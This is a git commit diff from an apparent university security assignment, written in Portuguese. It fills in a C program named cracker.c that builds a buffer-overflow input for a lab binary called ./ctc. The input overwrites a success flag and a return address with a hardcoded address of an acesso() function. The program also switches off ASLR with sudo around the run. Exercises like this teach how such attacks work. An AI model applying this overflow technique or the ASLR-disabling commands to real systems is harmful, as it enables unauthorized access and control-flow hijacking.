ac262e985a481695a0b18f878bc1ea00d4f64de2
Thiago Senff <thiagocpsenff2@gmail.com>
2023-09-18 03:40:35 -0300

    [FIX] Avaliação Opcional 1: Inserindo bandeira

--- opcional/av1/cracker.c
+++ opcional/av1/cracker.c
@@ -2,15 +2,57 @@
 #include <stdlib.h>
 #include <string.h>
 
+//#define STR_SIZE 92 //Defina o tamanho do seu buffer aqui
+
 int main(void) {
 
   FILE *f = fopen("./teste.in", "w+");
-  char *str;
+  int str_size;
+  char str[103];
   //Você deve preparar a string de entrada (STDIN) aqui!
-  fwrite(str, 1, strlen(str), f);  
+  unsigned long int temp;
+
+
+  // Passando o binario do endereço de acesso() para uma string*/
+  temp = 93824992235945;
+  char acesso_adress[sizeof(long int)+1];
+  memcpy(acesso_adress,&temp,sizeof(long int));
+  acesso_adress[sizeof(long int)] = '\0';
+
+  //Primeiro acesso
+  strcpy(str,"SB\nMUITOSEGURO\n");
+  
+  //Overflow em PASS, modifica STD_SUCCESS
+  strcat(str,"------------------------A BANDEIRA É MINHA\n");
+
+  //Overflow em P_USER, modifica rbi de login para acesso() 
+  strcat(str,"-----------------");
+  //strcat(str,"--------");
+  strcat(str,acesso_adress);
+
+  /*Qualquer valor para P_PASS*/
+  strcat(str,"\n----------");
+  
+  
+  str_size = strlen(str);
+  printf("%i\n",str_size);
+
+  /*
+  strcpy(str,overflow);
+  strcat(str,acesso_adress);
+  strcat(str,"\n-----------");
+  str_size = strlen(str);
+  */
+
+
+
+
+
+
+  fwrite(str, 1, str_size, f);  
   fclose(f);
 
   system("sudo echo 0 > /proc/sys/kernel/randomize_va_space");
-  system("./solucao < teste.in");
+  system("./ctc < teste.in");
   system("sudo echo 2 > /proc/sys/kernel/randomize_va_space");
 }
